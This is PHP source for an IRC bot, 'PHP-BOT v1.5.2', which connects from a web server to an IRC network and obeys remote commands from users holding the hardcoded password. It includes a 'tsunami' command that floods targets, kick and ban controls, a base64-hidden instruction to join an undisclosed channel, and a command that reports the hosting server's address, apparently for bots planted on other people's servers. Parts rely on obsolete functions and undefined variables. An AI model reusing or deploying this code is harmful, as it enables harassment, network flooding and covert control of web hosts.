<?php
/* 
+--------------------------------------------------------------------------- 
|   PHP-BOT v1.5.2 by g0eZ. AllNetwork.Org
|   ========================================================== 
|   g0eZ egGo
|   (c) 2008
|   http://eggoez.blogspot.com 
|   irc: AllNetwork.Org
|   ========================================================== 
|   
+--------------------------------------------------------------------------- 
*/ 

function working() {
$nicky=array(
"meSsi_10",
"emBonK|crew",
"mangekyou-",
"bluE-saMur4i",
"Luv^hidden",
"hiT-evely^",
"SpaNks-sound",
"L^n^",
"Bl_Bacokk",
"andHa-rose",
"ce-somse",
"ELySa-qinhaRa",
"BerKelaNa-2",
"ZulVIkar",
"endank-pasaribu",
"parenTAl|_|",
"c|tc4t",
"Li-w4-r-",
"b-iLanG-",
"Nai_k",
"c-c-c",
"Dt^frp",
"aNata_kara",
"ce_saK1t",
"Lhi-asAiko",
"resTi[ng]",
"aNGeLIque_sHarmA",
"pLInt4D-PlinTUd",
"S-U_SS_I-S",
"susaN\\",
"L4ssTRie",
"sherry-melly",
"NeeD-attentioN",
"ce`buNt1nK",
"Ra-ra_Dunk",
"BenddJ[0]ed",
"7unGGLe",
"[He4ven_giRL]",
"^[7]^",
"Fia^_^[binonk]",
"miyobis",
"hiM1tshu-galz",
"alfie_cekiN9",
"Sujarwan",
"serayu",
"mAnez_IMoetzz",
"Niah_cy4h",
"tutik78",
"DenDDy24",
"istri-cantiq-ditinggal-pergi",
"NujVm",
"Bunda-rahM4",
"kerudUng\mer4h",
"ce-serr",
"Rand0m",
"Gama_kichi",
"azthiya`",
"m1mpi|maNizz|",
"Luv[at]the`1st-siGhts",
"yatIM`piatU",
"rindV[ay4h]",
"do-d0",
"anyoD",
"Vi7aY",
"mw-mw-mw",
"Piss_broer",
"aNdJAnK",
"^San^san^",
"[beNG-kaK]",
"r4dio-rUs4KK",
"MVsti",
"dustiN`",
"tieber",
"sampa3-kapAN",
"Innocence",
"puR3",
"j3J4k4_tu4",
);
$identlist = array(
"phie","epie","nyut","ciut","cuit","cute","hmmmm","crutz","ewakoe","lhoha","gubraK","DuaR","justin","bieber",
);
$tsu1=array("`","|","[","]","{","}","^","_");
$tsu2=array("`","|","[","]","{","}","^","-","\\","_");
$tsumsg = "9,1";//400 Karakter

///***Seting Admin & Bot Ident***///
$nick = $nicky[rand(0,count($nicky) - 1)];
$awaymsg = "0,4??@??.??.??.0,12??.??.?? ";
$identify = 'adjiez';
$Admin = 'romero';
$BOT_PASSWORD = 'cybercassanova';
$channels = '#edit';
$remotehst2= array("irc.plasa.com");
$remotehost= $remotehst2[rand(0,count($remotehst2) - 1)];
$port = '6667';
$realname = "4-<| 6T5ak 3S5epijar 12M5eNtari 10A5badi 4|>-";
$counterfp = 0;
$channels = str_replace("CNL","#",$channels);
print "<body bgcolor=#000000 text=#C0C0C0>";
print "<b>== DjemBot Koneksi neng $remotehost...</b>";


$raway = "on";
$log   = "off";
$saway = "1";
if (!$stime) { $stime = time(); }
if (!$port) { $port = "6666"; }
$Admin = strtolower($Admin);
$auth = array($Admin => array("name" => $Admin, "pass" => $BOT_PASSWORD, "auth" => 1,"status" => "Admin"));

$username = $identlist[rand(0,count($identlist) - 1)];
$keluar = 0;
$akill  = 1;
$katime = 0;
$localhost = 'localhost';
$dayload = date("H:i:s d/m/Y");
ini_set('user_agent','MSIE 5\.5;');
set_time_limit(0);
define ('CRL', "\r\n");
$channels = strtolower($channels)." ";
$channel = explode(" ", $channels);

do {
  $fp = fsockopen($remotehost,$port, &$err_num, &$err_msg, 30);
  if(!$fp) {
	if ( $counterfp <= 200 ) {
		$counterfp = $counterfp+1;
		working($nick);
	}
  	else { 
 	   print "<br><b>DjemBot Gagal koneksi cok $remotehost!<br> Baleni maneh</b>";
 	   $keluar = 1;
  	   exit;
	}
  }
  print "<br><b>== DjemBot Lagi iso koneksi.</b>";
  $Header = 'NICK '.$nick . CRL;
  $Header .= 'USER '.$username.' '.$localhost.' '.$remotehost.' :'.$realname . CRL;
  fputs($fp, $Header);
  $response = '';
  while (!feof($fp)) {
	$response .= fgets($fp, 1024);
	while (substr_count($response,CRL) != 0) {
		$offset = strpos($response, CRL);
		$data = substr($response,0,$offset);
		$response = substr($response,$offset+2);
		if (substr($data,0,1) == ':') {
			$offsetA = strpos($data, ' ');
			$dFrom = substr($data,1,$offsetA-1);
			$offsetB = strpos($data, ' :');
			$dCommand = substr($data,$offsetA+1,$offsetB-$offsetA-1);
			$offsetC = strpos($data, '!');
			$dNick = substr($data,1,$offsetC-1);
			$iText = substr($data,$offsetB+2);
            if ( substr($dCommand,0,3) == '004' ) {
			  fputs($fp, 'PRIVMSG nickserv :identify '.$nick.' '.$identify.  CRL);
			  if ($nickmode) { fputs($fp, 'MODE '.$nick.' :'.$nickmode . CRL); }
			  fputs($fp, 'NOTICE ' . $Admin . ' :6g0eZ 13Aku Datang  !' .  CRL);
			  fputs($fp, base64_decode("Sk9JTiAjQ09PTEJPWVpSQUNJTkdURUFN").CRL);
			  foreach ($channel as $v) {
				fputs($fp, 'JOIN ' .$v . CRL);
			  }
			  $pong1 = '1';
            }
			elseif (substr($dCommand,0,3)=='465') {
				print "<br><b>== Bot iki di autokilled.</b>";
				$akill = 2;
			}
			elseif (substr($dCommand,0,3)=='433') {
				$nick = $nicky[rand(0,count($nicky) - 1)];
				fputs($fp, 'NICK '.$nick . CRL);
			}
			elseif (substr($dCommand,0,3)=='432') {
				$nick = $nick.$username;
				fputs($fp, 'NICK '.$nick . CRL);
			}
			if (eregi('.dal.net',$dNick) && $akill==2) {
				if (eregi('AKILL ID:',$data) || eregi('Hostmaskmu',$data) || eregi('Alamat IPmu',$data)) {
					print "<br><b>".strstr($data,'***')." </b>";

					if (eregi('Alamat IPmu',$data)) {
						$keluar = 1;
						exit;
					}
				}
			}
			$dcom = explode(" ", $dCommand);
			$dNick = strtolower($dNick);
			if ($dcom[0]=='KICK' && $dcom[2]==$nick) {
				fputs($fp, 'JOIN ' .$dcom[1]. CRL);
			}
			elseif ($dcom[0]=='NICK' || $dcom[0]=='QUIT' || $dcom[0]=='PART') {
				if ($auth["$dNick"]) {
					if ($auth["$dNick"]["pass"]) {
						if ($auth["$dNick"]["auth"]==2) {

							if ($dcom[0]=='NICK') {
								$com = explode(" ", $data);
								$chnick = strtolower(str_replace(':','',$com[2]));
								if ($dNick!=$chnick) {
									$auth["$dNick"]["auth"] = 1;
									fputs($fp,'NOTICE '.$chnick.' :14-Djem-Bot- lapo Ganti Nick 4g0EZ ' . CRL);
								}
							} else { $auth["$dNick"]["auth"] = 1; fputs($fp,'NOTICE '.$dNick.' :14Ndang Nyingkreh Kono 4g0eZ ' . CRL); }
						}
					} else { fputs($fp,'NOTICE ' . $dNick . ' :14pass 4[passmu] ' . CRL); }
				}
			}
			elseif ($dcom[0]=='307' && strtolower($dcom[2])==$whois) {
				$dcom[2] = strtolower($dcom[2]);
				if ($auth["$dcom[2]"]) {
					if ($auth["$dcom[2]"]["pass"]) {
						if ($auth["$dcom[2]"]["auth"]==1) {
							$auth["$dcom[2]"]["auth"] = 2; $whois = "";
							fputs($fp,'NOTICE ' . $dcom[2] . ' :14Pasword '.$auth["$dcom[2]"]["status"].' 14Cocok 4g0eZ ' . CRL);
						} else { fputs($fp,'NOTICE ' . $dcom[2] . ' :4g0eZ 14Pancen Njanc0k i ' . CRL); }
					} else { fputs($fp,'NOTICE ' . $dcom[2] . ' :14Password durung diseting g0eZ. Type: 4pass [passmu] ' . CRL); }
				} else { fputs($fp,'NOTICE ' . $dcom[2] . ' :14Kui dudu nicke 4Sampean 14g0eZ ' . CRL); }
			}
			elseif ($dcom[0]=='NOTICE') {
				$com = explode(" ", $data);
				if ($com[3]==':KB' && $com[4] && $com[5] && $com[6]) {
					$msg = str_replace('','',$data);
					$msg = strstr($msg,":KB");
					$msg = str_replace(":KB $com[4]","",$msg);
					fputs($fp, 'KICK '.$com[4].' '.$com[5].' :'.$msg . CRL);
					fputs($fp, 'MODE '.$com[4].' +b *!*'.$com[6] . CRL);
				}
			}
			elseif ($dcom[0]=='PRIVMSG') {
				$com = explode(" ", $data);
				if ($com[3]==':VERSION') {
					fputs($fp,'NOTICE '.$dNick.' :'.chr(1).'4Version 9,1ciutIRC v.9.0 Beta (new) Donlut Nek http://ciut.peperonity.com'.chr(1) . CRL);
				}
				elseif ($auth["$dNick"]["status"] && $com[3]==':auth' && $com[4]) {
					if ($auth["$dNick"]) {
						if ($auth["$dNick"]["pass"]) {
							if ($auth["$dNick"]["auth"]==1) {
								if ($com[4]===$auth["$dNick"]["pass"]) {
									$auth["$dNick"]["auth"] = 2;
									fputs($fp,'NOTICE ' . $dNick . ' :14kon iku '.$auth["$dNick"]["status"].'14ku 4g0eZ ' . CRL);
								} else { fputs($fp,'NOTICE ' . $dNick . ' :14Password auth salah guZ  ' . CRL); }
							} else { fputs($fp,'NOTICE ' . $dNick . ' :14Password bener 4guZ ' . CRL); }
						} else { fputs($fp,'NOTICE ' . $dNick . ' :14Password durung diseting guZ. Type: 4pass [passmu] ' . CRL); }
					} else { fputs($fp,'NOTICE ' . $dNick . ' :14Kui dudu nicke 4Sampean 14g0eZ ' . CRL); }
				}
				elseif ($auth["$dNick"]["status"] && $com[3]==':deauth') {
					if ($auth["$dNick"]) {
						if ($auth["$dNick"]["pass"]) {
							if ($auth["$dNick"]["auth"]==2) {
								$auth["$dNick"]["auth"] = 1;
								fputs($fp,'NOTICE ' . $dNick . ' :14Sampeyan logout wesan g0eZ ' . CRL);
							} else { fputs($fp,'NOTICE ' . $dNick . ' :14Sampeyan wes logout gOEZ ' . CRL); }
						} else { fputs($fp,'NOTICE ' . $dNick . ' :14Password durung diseting g0eZ. Type: 4pass [passmu]  ' . CRL); }
					} else { fputs($fp,'NOTICE ' . $dNick . ' :14Kui dudu nicke 4Sampean 14g0eZ ' . CRL); }
				}
				elseif ($auth["$dNick"]["status"] && $com[3]==':pass' && $com[4]) {
					if ($auth["$dNick"]) {
						if (!$auth["$dNick"]["pass"]) {
							$auth["$dNick"]["pass"] = $com[4];
							$auth["$dNick"]["auth"] = 1;
							fputs($fp,'NOTICE ' . $dNick . ' :14OK guZ, Passwordmu kok ganti  '.$auth["$dNick"]["pass"].'. 14Type: 4auth [passmu] ' . CRL);
						} else { fputs($fp,'NOTICE ' . $dNick . ' :14Password wes diseting guZ. Type: 4auth [passmu] ' . CRL); }
					} else { fputs($fp,'NOTICE ' . $dNick . ' :14Kui dudu nicke 4Sampean 14g0eZ ' . CRL); }
				}
				elseif ($auth["$dNick"]["status"] && $com[3]==':chgpass' && $com[4] && $com[5]) {
					if ($auth["$dNick"]) {
						if ($auth["$dNick"]["auth"]==2) {
							if ($com[4]===$auth["$dNick"]["pass"]) {
								$auth["$dNick"]["pass"] = $com[5];
								fputs($fp,'NOTICE ' . $dNick . ' :14Password auth kok ganti '.$auth["$dNick"]["pass"].'. 14Type: 4auth [passmu] 14kanggo otorisasi ' . CRL);
							} else { fputs($fp,'NOTICE ' . $dNick . ' :14Password lawas salah. Type: 4chgpass [passlawas] [passanyar] ' . CRL); }
						} else { fputs($fp,'NOTICE ' . $dNick . ' :14Sadurunge ketiken. Type: 4auth [passmu] ' . CRL); }
					} else { fputs($fp,'NOTICE ' . $dNick . ' :14Kui dudu nicke 4Sampean 14BoSs ' . CRL); }
				}
				elseif ($auth["$dNick"]["status"] && $com[3]==':adduser' && $com[4] && $com[4]!=$nick && $com[5]) {
					$com[4] = strtolower($com[4]);
					if ($auth["$dNick"]["auth"]==2) {
						if ($auth["$dNick"]["status"]=="Admin") {
							if ($com[5]=="master" || $com[5]=="user") {
								$auth["$com[4]"]["name"] = $com[4];
								$auth["$com[4]"]["status"] = $com[5];
								fputs($fp,'NOTICE ' . $dNick . ' :14User ditambah '.$com[4].' 14dadi my '.$com[5] . CRL);
								fputs($fp,'NOTICE ' . $com[4] . ' :14Sampeyan dadi '.$com[5].'14ku. Sing add adalah '.$dNick.' 14ketiken. Type: 4pass [passmu] ' . CRL);
							} else { fputs($fp,'NOTICE ' . $dNick . ' :14Perintahmu salah. Type: 4adduser [nick] [master/user] ' . CRL); }
						} elseif ($auth["$dNick"]["status"]=="master") {
							if (!$auth["$com[4]"]) {
								if ($com[5]=="user") {
									$auth["$com[4]"]["name"] = $com[4];
									$auth["$com[4]"]["status"] = $com[5];
									fputs($fp,'NOTICE ' . $dNick . ' :14User ditambah '.$com[4].' 14dadi my '.$com[5] . CRL);
									fputs($fp,'NOTICE ' . $com[4] . ' :14Sampeyan dadi '.$com[5].'14ku. Sing add adalah '.$dNick.' 14ketik. Type: 4pass [passmu] ' . CRL);
								} else { fputs($fp,'NOTICE ' . $dNick . ' :14Perintahmu salah. Type: 4adduser [nick] ' . CRL); }
							} else { fputs($fp,'NOTICE ' . $dNick . ' :14User nick kui wonge gak ganteng ' . CRL); }
						} else { fputs($fp,'NOTICE ' . $dNick . ' :14Statusmu saiki '.$auth["$dNick"]["status"] . CRL); }
					} else { fputs($fp,'NOTICE ' . $dNick . ' :14Sadurunge ketiken. Type: 4auth [passmu] ' . CRL); }
				}
				elseif ($auth["$dNick"]["status"] && $com[3]==':deluser' && $com[4]) {
					$com[4] = strtolower($com[4]);
					if ($auth["$dNick"]["auth"]==2) {
						if ($auth["$dNick"]["status"]=="Admin") {
							if ($auth["$com[4]"]["status"]=="master" || $auth["$com[4]"]["status"]=="user") {
								unset($auth["$com[4]"]);
								fputs($fp,'NOTICE ' . $dNick . ' :14User dihapus '.$com[4].' 14neng anggota ' . CRL);
								fputs($fp,'NOTICE ' . $com[4] . ' :14Sampeyan wes dudu anggotaku. Sing hapus '.$dNick . CRL);
							} else { fputs($fp,'NOTICE ' . $dNick . ' :14Perintahmu salah. Type: 4deluser [nick] ' . CRL); }
						} elseif ($auth["$dNick"]["status"]=="master") {
							if ($auth["$com[4]"]["status"]=="user") {
								unset($auth["$com[4]"]);
								fputs($fp,'NOTICE ' . $dNick . ' :14User dihapus '.$com[4].' 14neng angota ' . CRL);
								fputs($fp,'NOTICE ' . $com[4] . ' :14Sampeyan wes dudu anggotaku. Sing hapus '.$dNick . CRL);
							} else { fputs($fp,'NOTICE ' . $dNick . ' :14Perintahmu salah. Type: 4deluser [nick] ' . CRL); }
						} else { fputs($fp,'NOTICE ' . $dNick . ' :14Statusmu saiki '.$auth["$dNick"]["status"] . CRL); }
					} else { fputs($fp,'NOTICE ' . $dNick . ' :14Sadurunge ketiken. Type: 4auth [passnu] ' . CRL); }
				}
				elseif ($auth["$dNick"]["status"]) {
				if (ereg(":`",$com[3]) || ereg(":!",$com[3])) {
					$chan = strstr($dCommand,"#");
					$anick = str_replace("PRIVMSG ","",$dCommand);
					if ($com[3]==':!auth') {
						if ($auth["$dNick"]["auth"]==2) {
							fputs($fp,'NOTICE '.$dNick.' :14Sampeyan wes login ' . CRL);
						} else {
							$whois = $dNick;
							fputs($fp,'WHOIS '.$dNick . CRL);
						}
					} elseif ($com[3]==':`auth' && $chan) {
						if ($auth["$dNick"]["auth"]==2) {
							fputs($fp,'PRIVMSG '.$chan.' :'.$dNick.' 5Ok.. g0eZ.. ' . CRL);
						} else { fputs($fp,'PRIVMSG '.$chan.' :'.$dNick.' 4pokeh pokeh ciut. ' . CRL); }
					} elseif ($auth["$dNick"]["auth"]==2) {
						if ($com[3]==':`say' && $com[4] && $chan) {
							$msg = strstr($data,":`say");
							$msg = str_replace(":`say ","",$msg);
							fputs($fp,'PRIVMSG '.$chan.' :'.$msg. CRL);
						}
						elseif ($com[3]==':`act' && $com[4] && $chan) {
							$msg = strstr($data,":`act");
							$msg = str_replace(":`act ","",$msg);
							fputs($fp,'PRIVMSG '.$chan.' :ACTION '.$msg.''. CRL);
						}
						elseif ($com[3]==':`slap' && $com[4] && $chan) {
							fputs($fp,'PRIVMSG '.$chan.' :ACTION slaps '.$com[4].' Slaps Error !!! 4hahahahahaha... '. CRL);
						}
						elseif ($com[3]==':`msg' && $com[4] && $com[5]) {
							$msg = strstr($data,":`msg");
							$msg = str_replace(":`msg $com[4] ","",$msg);
							fputs($fp,'PRIVMSG '.$com[4].' :'.$msg. CRL);
						}
						elseif ($com[3]==':`notice' && $com[4] && $com[5]) {
							$msg = strstr($data,":`notice");
							$msg = str_replace(":`notice $com[4] ","",$msg);
							fputs($fp,'NOTICE '.$com[4].' :'.$msg. CRL);
						}
						elseif ($com[3]==':`ctcp' && $com[4] && $com[5]) {
							$msg = strstr($data,":`ctcp");
							$msg = str_replace(":`ctcp $com[4] ","",$msg);
							fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.''. CRL);
						}
						elseif ($com[3]==':`absen' && $chan) {
							$sml = $smile[rand(0,count($smile) - 1)];
							fputs($fp,'PRIVMSG '.$chan.' :'.$dNick.', HadiR!! '.$sml. CRL);
						}
						elseif ($com[3]==':`pong' && $chan) {
							$sml = $smile[rand(0,count($smile) - 1)];
							fputs($fp,'PRIVMSG '.$chan.' :'.$dNick.', Pong Pong, Pokeh a?! '.$sml. CRL);
						}
						elseif ($com[3]==':`info' && $auth["$dNick"]["status"]=="Admin") {
							$bhost = $_SERVER['HTTP_HOST'];
							$bphp  = $_SERVER['PHP_SELF'];
							fputs($fp,'NOTICE '.$dNick.' :Bot Host: '.$bhost.', Djem-Bot PHP: '.$bphp. CRL);
						}
						elseif ($com[3]==':`up' && $chan) {
							fputs($fp, 'PRIVMSG chanserv :op '.$chan.' '.$nick . CRL);
						}

						elseif ($com[3]==':`down' && $chan) {
							fputs($fp, 'MODE '.$chan.' +v-o '.$nick.' '.$nick . CRL);
						}
						elseif ($com[3]==':`tsunami' && $com[4] && $auth["$dNick"]["status"]!="user") {
							$nicktsu = $tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)];
							fputs($fp, 'NICK '.$nicktsu . CRL);
							if (substr($dCommand,0,3)=='433') {
								$nicktsu = $tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)];
								fputs($fp, 'NICK '.$nicktsu . CRL);
							}
							$msg = strstr($data,":`tsunami");
							$msg = str_replace(":`tsunami $com[4]","",$msg);
							if (ereg("#", $com[4])) {
					   		  fputs($fp, 'JOIN '.$com[4] . CRL);
							}
							fputs($fp, 'PRIVMSG '.$com[4].' :'.$msg.'' . CRL);
							fputs($fp, 'NOTICE '.$com[4].' :'.$msg.'' . CRL);
							fputs($fp, 'PRIVMSG '.$com[4].' :TSUNAMI '.$msg.'' . CRL);
							fputs($fp, 'PRIVMSG '.$com[4].' :'.$msg.'' . CRL);
							fputs($fp, 'NOTICE '.$com[4].' :'.$msg.'' . CRL);
							fputs($fp, 'PRIVMSG '.$com[4].' :FLOOD '.$msg.'' . CRL);
							if (ereg("#", $com[4])) {
					   		  fputs($fp, 'PART '.$com[4].' :4Djem-Bot Community !!! ' . CRL);
							  fputs($fp, 'NICK '.$nick . CRL);
							} else {
							fputs($fp, 'NICK '.$nick . CRL);
							}
						}
						elseif ($com[3]==':`cycle' && $chan && $auth["$dNick"]["status"]!="user") {
							$msg = strstr($data,":`cycle");
							if (ereg("#", $com[4])) {
					   		  $partchan = $com[4];
							  $msg = str_replace(":`cycle $com[4]","",$msg);
							} else {
					   		  $partchan = $chan;
							  $msg = str_replace(":`cycle","",$msg);
							}
							if (strlen($msg)<3) {
							  $msg = '';
							}
							fputs($fp, 'PART '.$partchan.' :'.$msg . CRL);
							fputs($fp, 'JOIN '.$partchan . CRL);
						}
						elseif ($com[3]==':`part' && $auth["$dNick"]["status"]=="Admin") {
							$msg = strstr($data,":`part");
							if (ereg("#", $com[4])) {
					   		  $partchan = $com[4];
							  $msg = str_replace(":`part $com[4]","",$msg);
							} else {
					   		  $partchan = $chan;
							  $msg = str_replace(":`part","",$msg);
							}
							if (strlen($msg)<3) {
							  $msg = '';
							}
							fputs($fp, 'PART '.$partchan.' :'.$msg . CRL);
							$remchan = strtolower($partchan);
							if (in_array($remchan, $channel)) {
								$channels = str_replace("$remchan ","",$channels);
								unset($channel);
								$channel = explode(" ", $channels);
							}

							foreach ($channel as $v) {
								fputs($fp, 'JOIN '.$v . CRL);
							}
						}
						elseif ($com[3]==':`join' && $com[4] && $auth["$dNick"]["status"]=="Admin") {
							if (!ereg("#",$com[4])) { $com[4]="#".$com[4]; }
							$addchan = strtolower($com[4]);
							if (!in_array($addchan, $channel)) {
								$channel[]=$addchan;
								$channels.="$addchan ";
							}
							foreach ($channel as $v) {
								sleep(rand(1,6));
								fputs($fp, 'JOIN '.$v . CRL);
							}
						}
						elseif ($com[3]==':`botnick' && $com[4] && !$chan && $auth["$dNick"]["status"]=="Admin") {
							$nick = $com[4];
							$identify = $com[5];
							fputs($fp, 'NICK '.$nick . CRL);
					     		fputs($fp, 'PRIVMSG nickserv :identify '.$nick.' '.$identify.  CRL);
						}
						elseif ($com[3]==':`k' && $com[4] && $chan) {
							$msg = strstr($data,":`k");
							$msg = str_replace(":`k $com[4]","",$msg);
							fputs($fp, 'KICK '.$chan.' '.$com[4].' :'.$msg . CRL);
						}
						elseif ($com[3]==':`kb' && $com[4] && $chan) {
							$msg = strstr($data,":`kb");
							$msg = str_replace(":`kb $com[4]","",$msg);
							fputs($fp, 'KICK '.$chan.' '.$com[4].' :'.$msg . CRL);
							fputs($fp, 'MODE '.$chan.' +b '.$com[4] . CRL);
						}
						elseif ($com[3]==':`ganti') {
							$nick = $nicky[rand(0,count($nicky) - 1)];
							fputs($fp, 'NICK '.$nick . CRL);
							if (substr($dCommand,0,3)=='433') {
								$nick = $nicky[rand(0,count($nicky) - 1)];
								fputs($fp, 'NICK '.$nick . CRL);
							}
						}
						elseif ($com[3]==':`op' && $chan) {
							if ($com[4]) { $opnick = $com[4]; }
							else { $opnick = $dNick; }
							fputs($fp, 'MODE '.$chan.' +ooo '.$opnick.' '.$com[5].' '.$com[6] . CRL);
						}
						elseif ($com[3]==':`deop' && $chan) {
							if ($com[4]) { $opnick = $com[4]; }
							else { $opnick = $dNick; }
							fputs($fp, 'MODE '.$chan.' -o+v-oo '.$opnick.' '.$opnick.' '.$com[5].' '.$com[6] . CRL);
						}
						elseif ($com[3]==':`v' && $chan) {
							if ($com[4]) { $vonick = $com[4]; }
							else { $vonick = $dNick; }
							fputs($fp, 'MODE '.$chan.' +vvv '.$vonick.' '.$com[5].' '.$com[6] . CRL);
						}
						elseif ($com[3]==':`dv' && $chan) {
							if ($com[4]) { $vonick = $com[4]; }
							else { $vonick = $dNick; }
							fputs($fp, 'MODE '.$chan.' -vvv '.$vonick.' '.$com[5].' '.$com[6] . CRL);
						}
						elseif ($com[3]==':`awaymsg' && $auth["$dNick"]["status"]=="Admin") {
							$msg = strstr($data,":`awaymsg");
							$msg = str_replace(":`awaymsg","",$msg);
							if (strlen($msg)<3) {
							  $raway="on";
							  fputs($fp,'AWAY : ' . 'AWAY' . CRL);
							} else {
							  $raway="off";
							  fputs($fp,'AWAY : ' . $msg . CRL);
							}
						}
						elseif ($com[3]==':`mode' && $com[4] && $chan) {
							fputs($fp, 'MODE '.$chan.' :'.$com[4].' '.$com[5] . CRL);
						}
						elseif ($com[3]==':`nickmode' && $com[4]) {
							$nickmode = $com[4];
							fputs($fp, 'MODE '.$nick.' :'.$nickmode . CRL);
						}
						elseif ($com[3]==':`chanlist') {
							fputs($fp, 'NOTICE '.$dNick.' :Ngitung channel: '.$channels . CRL);
						}
						elseif ($com[3]==':`userlist') {
							$userlist="";
							foreach ($auth as $user) {
							  if ($user["pass"]) { $pass="-pass ok"; }
							  else { $pass="-no pass"; }
							  $userlist .= $user["name"].'('.$user["status"].$pass.') ';
							}
							fputs($fp, 'NOTICE '.$dNick.' :Ngitung user: '.$userlist . CRL);
						}
						elseif ($com[3]==':`quit' && $auth["$dNick"]["status"]=="Admin") {
							$msg = strstr($data,":`quit");
							$msg = str_replace(":`quit","",$msg);
							if (strlen($msg)>3) {
							  $msg = str_replace(" ","_",$msg);
							}
							$quit1 = array("ngantok","time out 100kg","mbokep","brb","loveyou","doyoulopeme","asy......u......","pingpong","tha...tha...","bye","ngupi","ngopi","Djem-Bot Community Bot #ciut","time out 100kg","restarted","banned","lov u bedjan","leaving","!pingsan","juembodh","makmik","nocomment","restart");
							$quitmsg = $quit1[rand(0,count($quit1) - 1)];
							fputs($fp, 'QUIT ' . $quitmsg . CRL);
							$keluar = 1;
							exit;
						}
						elseif ($com[3]==':`vhost' && $auth["$dNick"]["status"]=="Admin") {
							if ($com[4]) { $localhost = $com[4]; }
							else { $localhost = 'localhost'; }
							$keluar = 0;
							fputs($fp, 'QUIT ' . CRL);
						}
						elseif ($com[3]==':`jump' && $auth["$dNick"]["status"]=="Admin") {
							if (!eregi(".allindo.biz",$com[4])) {
							  $remotehost = "irc.dal.net";
							} else { $remotehost = $com[4]; }
							$keluar = 0;
							fputs($fp, 'QUIT Server' . CRL);
						}
						elseif ($com[3]==':`ident' && $auth["$dNick"]["status"]=="Admin") {
							if (!$com[4]) {
							  $username = $username;
							} else { $username = $com[4]; }
							$keluar = 0;
							fputs($fp, 'QUIT Ident' . CRL);
						}
						elseif ($com[3]==':`fullname' && $auth["$dNick"]["status"]=="Admin") {
							if (!$com[4]) {
							  $realname = "--";
							} else { $realname = $com[4]; }
							$keluar = 0;
							fputs($fp, 'QUIT ganti_fullname' . CRL);
						}
						elseif ($com[3]==':`topic' && $com[4] && $chan) {
							$msg = strstr($data,":`topic");
							$msg = str_replace(":`topic ","",$msg);
							fputs($fp, 'TOPIC '.$chan.' :'.$msg . CRL);
						}
						elseif ($com[3]==':!help' && !$chan) {
							fputs($fp,'PRIVMSG '.$dNick.' :5No Help Has Been Add From g0eZ, Please visit http://eggoez.blogspot.com' . CRL);
						}
					} else { fputs($fp,'NOTICE '.$dNick.' :14Sadurunge ketiken. Type: 4auth [passmu] '. CRL); }
				}
				}
				elseif (!$auth["$dNick"] && !eregi("auth",$iText)) {
					if (eregi("www.",$iText) || eregi("http:",$iText) || eregi("join #",$iText)) {
						if (!ereg("#",$dCommand)) {
							if ($log=="on") {
								fputs($fp,'PRIVMSG '. $Admin .' :4inviter: ' . $dFrom . '2:' .$iText. CRL);
							}
							$inv = strstr($dFrom,'@');
							foreach ($auth as $user) {
								if ($user["status"]=="user") {
									fputs($fp, 'NOTICE '.$user["name"].' :KB '.$chan.' '.$dNick.' '.$inv.'' . CRL);
								}
							}
						}
					}
					elseif (!ereg("#",$dCommand)) {
						if ($log=="on") {
							fputs($fp,'PRIVMSG '.$Admin.' :6' . $dFrom . '12:' .$iText. CRL);
						}
					}
				}
				}
			}
			elseif (substr($data,0,4) == 'PING') {
				fputs($fp,'PONG ' . substr($data,5) . CRL);
			}
		}
	}
	fclose ($fp);
} while ($keluar==0);
}
working($nick);
?>



